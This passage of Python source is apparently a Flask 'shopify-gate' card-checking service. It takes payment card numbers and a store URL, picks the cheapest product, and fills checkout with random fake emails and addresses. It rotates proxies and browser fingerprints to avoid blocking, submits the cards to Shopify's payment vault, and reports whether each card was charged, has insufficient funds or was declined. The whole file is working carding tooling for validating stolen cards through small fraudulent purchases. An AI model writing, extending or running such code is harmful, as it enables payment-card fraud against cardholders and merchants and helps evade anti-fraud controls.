                "checkout[client_details][browser_tz]": "-330",
            }
            r4 = s.post(checkout_url, data=contact)
            if r4.status_code not in (200, 302):
                return {"status": "error", "step": "legacy_contact", "error": f"contact {r4.status_code}"}
            if "Shipping Method" not in r4.text and "Shipping method" not in r4.text:
                return {"status": "error", "step": "legacy_shipping", "error": "shipping step not reached"}
            # 5. shipping rates
            ship_tag = ""
            try:
                r5 = s.get(f"{checkout_url}/shipping_rates?step=shipping_method")
                m5 = re.search(r'<div class="radio-wrapper" data-shipping-method="([^"]+)"', r5.text)
                if m5:
                    ship_tag = m5.group(1)
            except Exception:
                pass
            if not ship_tag:
                return {"status": "error", "step": "legacy_rates", "error": "no shipping method id"}
            # 6. payment method step
            ship = {
                "_method": "patch", "authenticity_token": authenticity,
                "previous_step": "shipping_method", "step": "payment_method",
                "checkout[shipping_rate][id]": ship_tag,
                "checkout[client_details][browser_width]": str(random.randint(1200, 1600)),
                "checkout[client_details][browser_height]": str(random.randint(600, 900)),
                "checkout[client_details][javascript_enabled]": "1",
                "checkout[client_details][color_depth]": "24",
                "checkout[client_details][java_enabled]": "false",
                "checkout[client_details][browser_tz]": "-330",
            }
            r6 = s.post(checkout_url, data=ship)
            payment_due = _extract(r6.text, r'"payment_due":\s*"([^"]+)"')
            gateway = _extract(r6.text, r'data-subfields-for-gateway="([^"]+)"')
            # 7. legacy vault tokenization (plain form, no sig)
            pci_payload = json.dumps({
                "credit_card": {"number": card["number"], "name": f"{addr['firstName']} {addr['lastName']}",
                                "month": card["month"], "year": card["year"],
                                "verification_value": card["cvv"]},
                "payment_session_scope": webname,
            })
            pci_headers = {"accept": "application/json", "content-type": "application/json",
                           "origin": "https://checkout.shopifycs.com",
                           "referer": "https://checkout.shopifycs.com/"}
            vault_id = ""
            for _vault in ("https://deposit.us.shopifycs.com/sessions",
                           "https://elb.deposit.shopifycs.com/sessions",
                           "https://deposit.shopifycs.com/sessions",
                           "https://checkout.pci.shopifyinc.com/sessions"):
                if _lane_cooling(proxy_url):
                    break
                try:
                    rv = s.post(_vault, data=pci_payload, headers=pci_headers)
                    mv = re.search(r'"id"\s*:\s*"([^"]+)"', rv.text or "")
                    if mv:
                        vault_id = mv.group(1)
                        break
                    if rv.status_code in (403, 500, 502, 503) or _is_challenge_html(rv.text):
                        _lane_burn(proxy_url, 60 if rv.status_code == 403 else PCI_BURN_SECONDS)
                        break
                    if rv.status_code == 429:
                        time.sleep(random.uniform(0.4, 0.8))
                        continue
                except Exception:
                    continue
            if not vault_id:
                return {"status": "error", "step": "legacy_pci", "error": "no vault session id"}
            # 8. final PATCH
            final_data = {
                "_method": "patch", "authenticity_token": authenticity,
                "previous_step": "payment_method", "step": "", "s": vault_id,
                "checkout[payment_gateway]": gateway,
                "checkout[credit_card][vault]": "false",
                "checkout[different_billing_address]": "false",
                "checkout[remember_me]": "0", "checkout[vault_phone]": "",
                "checkout[total_price]": payment_due, "complete": "1",
                "checkout[client_details][browser_width]": str(random.randint(1200, 1600)),
                "checkout[client_details][browser_height]": str(random.randint(600, 900)),
                "checkout[client_details][javascript_enabled]": "1",
                "checkout[client_details][color_depth]": "24",
                "checkout[client_details][java_enabled]": "false",
                "checkout[client_details][browser_tz]": "-330",
            }
            r7 = s.post(checkout_url, data=final_data)
            try:
                g = s.get(f"{checkout_url}/processing?from_processing_page=1&validate=true", allow_redirects=True)
            except Exception:
                g = None
            final_html = (g.text if g is not None else (r7.text or ""))
            final_url = (g.url if g is not None else "")
            gw = gateway or "shopify_payments"
            if "/thank" in final_url or "/orders/" in final_url:
                return {"status": "charged", "code": "ORDER_PAID", "gate": gw}
            low = final_html.lower()
            if "3d_secure" in low or "3d secure" in low:
                return {"status": "approved", "code": "3DS_REQUIRED", "gate": gw}
            if "insufficient fund" in low:
                return {"status": "approved", "code": "INSUFFICIENT_FUNDS", "gate": gw}
            if "incorrect cvv" in low or "invalid cvv" in low or "security code" in low:
                return {"status": "declined", "code": "CVV_INVALID", "gate": gw}
            if "expired" in low:
                return {"status": "declined", "code": "CARD_EXPIRED", "gate": gw}
            notice = _extract(final_html, r'<p class="notice__text">([^<]+)</p>')
            if notice:
                return {"status": "declined", "code": notice.strip()[:80] or "CARD_DECLINED", "gate": gw}
            return {"status": "declined", "code": "CARD_DECLINED", "gate": gw}
        except Exception as e:
            return {"status": "error", "step": "legacy_exc", "error": str(e)[:120]}


def graphql_checkout(shop_url, variant, card, email, shipping, billing, currency, country, proxy, proxies=None):
    variant_id = variant["variant_id"]
    proxy_url = _norm_proxy(proxy or None)
    with curl_requests.Session(impersonate=random.choice(BROWSER_PROFILES)) as session:
        session.timeout = 10
        cu = _storefront_checkout_url(session, shop_url, variant_id, country, proxy_url)
        if not cu:
            return {"status": "error", "code": "CART_ERROR", "step": "cart_create"}
        return persisted_checkout(shop_url, variant, card, email, shipping, billing, currency, country, proxy,
                                  checkout_url_override=cu, dynamic_ids=True, proxies=proxies)


def _parse_card(card):
    if isinstance(card, dict):
        return card
    parts = re.split(r"[|\s:/]+", str(card).strip())
    if len(parts) < 4:
        return None
    number = parts[0]
    idx = 1
    while len(number) < 13 and idx < len(parts) - 3 and parts[idx].isdigit():
        number += parts[idx]
        idx += 1
    if not (13 <= len(number) <= 19) or not number.isdigit():
        return None
    return {"number": number, "month": parts[idx], "year": parts[idx + 1], "cvv": parts[idx + 2]}


def _map_code(result):
    code = result.get("code", "")
    if code:
        return code
    step = result.get("step", "")
    err = str(result.get("error", ""))
    if "discovery" in step or "no cheap" in err:
        return "NO_PRODUCTS"
    if "cart" in step or "checkout" in step or "token" in step:
        return "CART_ERROR"
    if "proposal" in step or "extract" in step:
        return "PROPOSAL_ERROR"
    if "pci" in step:
        return "PCI_ERROR"
    if "submit" in step:
        return "SUBMIT_ERROR"
    if "poll" in step or "timeout" in step:
        return "POLL_TIMEOUT"
    return "ERROR"


def _respond(card, currency, result, variant, proxy_status="not used"):
    code = _map_code(result)
    response = code
    st = result.get("status", "error")
    if st == "charged":
        response = "ORDER_PAID"
    elif st == "approved":
        response = code or "APPROVED"
    elif st == "declined":
        response = "CARD_DECLINED" if code == "CAPTCHA_REQUIRED" else (code or "CARD_DECLINED")
    status_str = "true" if response in ("INSUFFICIENT_FUNDS", "ORDER_PAID") else "false"
    print(f"[resp] code={response} status={status_str} step={result.get('step','')} err={str(result.get('error',''))[:80]}", flush=True)
    return jsonify({
        "CC": f"{card.get('number','')}|{card.get('month','')}|{card.get('year','')}|{card.get('cvv','')}",
        "Currency": currency,
        "Gateway": result.get("gate", "") or "shopify_payments",
        "Price": _fmt(result.get("amount") or (variant.get("price") if variant else "")),
        "Proxy": proxy_status or "not used",
        "Response": response,
        "Status": status_str,
    })


def _fmt(amount):
    if not amount:
        return "0.00"
    try:
        return f"{float(amount):.2f}"
    except (ValueError, TypeError):
        return str(amount)


def _request_common():
    if request.method == "GET":
        cc = request.args.get("cc", "").strip()
        site = request.args.get("site", "").strip()
        proxy = request.args.get("proxy", "").strip()
        proxy_urls = request.args.get("proxy_urls", "").strip()
        data = {}
    else:
        data = request.get_json(force=True)
        cc = data.get("cc") or data.get("card") or ""
        site = data.get("site") or data.get("shop") or ""
        proxy = data.get("proxy") or ""
        proxy_urls = data.get("proxy_urls") or ""
    shop_url = site.rstrip("/")
    if shop_url and not shop_url.startswith(("http://", "https://")):
        shop_url = "https://" + shop_url
    card = _parse_card(cc)
    proxy = _norm_proxy(proxy or None)
    proxies = []
    if proxy:
        proxies.append(proxy)
    for p in re.split(r"[,|\s]+", proxy_urls or ""):
        p = _norm_proxy(p)
        if p and p not in proxies:
            proxies.append(p)
    proxy_status = "not used"
    if proxies:
        alive = []
        for p in proxies[:5]:
            if _proxy_ok(p, shop_url + "/"):
                alive.append(p)
                _remember_alive(p)
        if alive:
            proxies = alive
            proxy = alive[0]
            proxy_status = "live"
        else:
            proxies = None
            proxy = None
            proxy_status = "dead"
    if not proxies:
        proxies = []
    # top up lanes with recently-proven proxies so PCI always has a healthy lane
    now = time.time()
    for p, t in reversed(_ALIVE_RING):
        if now - t > 120 or _lane_cooling(p) or p in proxies:
            continue
        proxies.append(p)
        if len(proxies) >= 3:
            break
    if proxies:
        proxy = proxy or proxies[0]
    proxies = proxies or None
    return data, shop_url, card, proxy, proxies, proxy_status


@app.route("/shopii", methods=["GET", "POST"])
@app.route("/shopii/persisted", methods=["GET", "POST"])
def shopii_persisted():
    try:
        data, shop_url, card, proxy, proxies, proxy_status = _request_common()
        min_price = float(data.get("min_price", 0.50)) if request.method == "POST" else 0.50
        max_price = float(data.get("max_price", 0.0)) if request.method == "POST" else 0.0
        variant = data.get("variant") if request.method == "POST" else None
        if not shop_url or not card:
            return jsonify({"CC": request.args.get("cc", ""), "Currency": "USD", "Gateway": "unknown",
                            "Price": "0.00", "Proxy": proxy_status,
                            "Response": "MISSING_CARD" if not card else "MISSING_SITE", "Status": "false"}), 400

        currency, country = fetch_store_currency(shop_url, proxy)
        email = generate_random_email()
        addr = random_address(country)
        shipping = dict(addr)
        billing = dict(addr)

        result = None
        direct_tried = False
        ladder = [min_price, 2.0, 5.0]
        cur_min = ladder[0]
        _pace(shop_url)
        if variant:
            result = persisted_checkout(shop_url, variant, card, email, shipping, billing, currency, country, proxy, proxies=proxies)
            variant = None
        for _ in range(len(ladder) + 6):
            if result is None:
                variant = find_cheapest_product(shop_url, proxy, cur_min, max_price)
                if not variant:
                    result = {"status": "error", "step": "discovery", "error": "no cheap products found"}
                    break
                result = persisted_checkout(shop_url, variant, card, email, shipping, billing, currency, country, proxy, proxies=proxies)
                continue
            err = str(result.get("error", ""))
            code = result.get("code", "")
            if "PAYMENTS_UNACCEPTABLE_PAYMENT_AMOUNT" in err or code == "PAYMENTS_UNACCEPTABLE_PAYMENT_AMOUNT":
                variant = find_cheapest_product(shop_url, proxy, min(ladder) + (cur_min or 2.0), max_price)
                if not variant or cur_min >= ladder[-1]:
                    break
                cur_min = ladder[min(ladder.index(cur_min) + 1 if cur_min in ladder else 0, len(ladder) - 1)]
                variant = find_cheapest_product(shop_url, proxy, cur_min, max_price)
                if not variant:
                    result = {"status": "error", "step": "discovery", "error": "no cheap products found"}
                    break
                result = persisted_checkout(shop_url, variant, card, email, shipping, billing, currency, country, proxy, proxies=proxies)
                continue
            if "DELIVERY_NO_DELIVERY_STRATEGY" in err:
                tried = False
                for fc in ("US", "CA", "GB", "AU"):
                    if fc == country:
                        continue
                    addr = random_address(fc)
                    shipping = dict(addr)
                    billing = dict(addr)
                    if variant:
                        result = persisted_checkout(shop_url, variant, card, email, shipping, billing, currency, fc, proxy, proxies=proxies)
                        if "DELIVERY_NO_DELIVERY_STRATEGY" not in str(result.get("error", "")):
                            country = fc
                            tried = True
                            break
                if not tried:
                    break
                continue
            if "no token/session" in err or "checkout_init" in err:
                if proxy and not direct_tried:
                    direct_tried = True
                    if variant:
                        result = persisted_checkout(shop_url, variant, card, email, shipping, billing, currency, country, None, proxies=None)
                    else:
                        variant = find_cheapest_product(shop_url, None, cur_min, max_price)
                        if not variant:
                            result = {"status": "error", "step": "discovery", "error": "no cheap products found"}
                            break
                        result = persisted_checkout(shop_url, variant, card, email, shipping, billing, currency, country, None, proxies=None)
                    continue
                variant = find_cheapest_product(shop_url, proxy, cur_min + 0.01, max_price)
                if not variant:
                    result = {"status": "error", "step": "discovery", "error": "no cheap products found"}
                    break
                result = persisted_checkout(shop_url, variant, card, email, shipping, billing, currency, country, proxy, proxies=proxies)
                continue
            break

        code0 = _map_code(result)
        if code0 in ("PCI_ERROR", "CART_ERROR", "PROPOSAL_ERROR", "ERROR") and variant:
            if "__ALL_LANES_PARKED__" not in str(result.get("error", "")):
                leg = legacy_checkout(shop_url, variant, card, proxy)
                if leg.get("status") in ("charged", "approved", "declined"):
                    result = leg
        return _respond(card, currency, result, variant, proxy_status)
    except Exception as e:
        return jsonify({"CC": "", "Currency": "USD", "Gateway": "unknown",
                        "Price": "0.00", "Proxy": "not used", "Response": "ERROR", "Status": "false"}), 200


@app.route("/shopiig", methods=["GET", "POST"])
@app.route("/shopii/graphql", methods=["GET", "POST"])
def shopii_graphql():
    try:
        data, shop_url, card, proxy, proxies, proxy_status = _request_common()
        min_price = float(data.get("min_price", 0.50)) if request.method == "POST" else 0.50
        max_price = float(data.get("max_price", 0.0)) if request.method == "POST" else 0.0
        variant = data.get("variant") if request.method == "POST" else None
        if not shop_url or not card:
            return jsonify({"CC": request.args.get("cc", ""), "Currency": "USD", "Gateway": "unknown",
                            "Price": "0.00", "Proxy": proxy_status,
                            "Response": "MISSING_CARD" if not card else "MISSING_SITE", "Status": "false"}), 400

        currency, country = fetch_store_currency(shop_url, proxy)
        email = generate_random_email()
        addr = random_address(country)
        shipping = dict(addr)
        billing = dict(addr)

        if not variant:
            variant = find_cheapest_product(shop_url, proxy, min_price, max_price)
        if not variant:
            return jsonify({"CC": f"{card.get('number','')}|{card.get('month','')}|{card.get('year','')}|{card.get('cvv','')}",
                            "Currency": currency, "Gateway": "shopify_payments",
                            "Price": "0.00", "Proxy": proxy_status,
                            "Response": "NO_PRODUCTS", "Status": "false"}), 200

        result = None
        _pace(shop_url)
        result = graphql_checkout(shop_url, variant, card, email, shipping, billing, currency, country, proxy, proxies=proxies)
        if result.get("code") == "CART_ERROR" and proxy:
            direct_result = graphql_checkout(shop_url, variant, card, email, shipping, billing, currency, country, None, proxies=None)
            if direct_result.get("code") != "CART_ERROR":
                result = direct_result
        for _retry in range(3):
            if "PAYMENTS_UNACCEPTABLE_PAYMENT_AMOUNT" in str(result.get("code", "")) or \
               "PAYMENTS_UNACCEPTABLE_PAYMENT_AMOUNT" in str(result.get("error", "")):
                cur_min = [2.0, 5.0, 10.0][_retry]
                nxt = find_cheapest_product(shop_url, proxy, cur_min, max_price)
                if not nxt or nxt.get("variant_id") == variant.get("variant_id"):
                    break
                variant = nxt
                result = graphql_checkout(shop_url, variant, card, email, shipping, billing, currency, country, proxy, proxies=proxies)
            else:
                break

        code0 = _map_code(result)
        if code0 in ("PCI_ERROR", "CART_ERROR", "PROPOSAL_ERROR", "ERROR"):
            leg = legacy_checkout(shop_url, variant, card, proxy)
            if leg.get("status") in ("charged", "approved", "declined"):
                result = leg
        return _respond(card, currency, result, variant, proxy_status)
    except Exception as e:
        return jsonify({"CC": "", "Currency": "USD", "Gateway": "unknown",
                        "Price": "0.00", "Proxy": "not used", "Response": "ERROR", "Status": "false"}), 200


@app.route("/shopii/health", methods=["GET"])
def health():
    return jsonify({"status": "ok", "service": "shopify-gate"})


@app.errorhandler(Exception)
def _handle_all(e):
    return jsonify({"CC": "", "Currency": "USD", "Gateway": "unknown",
                    "Price": "0.00", "Proxy": "not used",
                    "Response": "ERROR", "Status": "false"}), 200


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=PORT, debug=False, threaded=True, use_reloader=False)
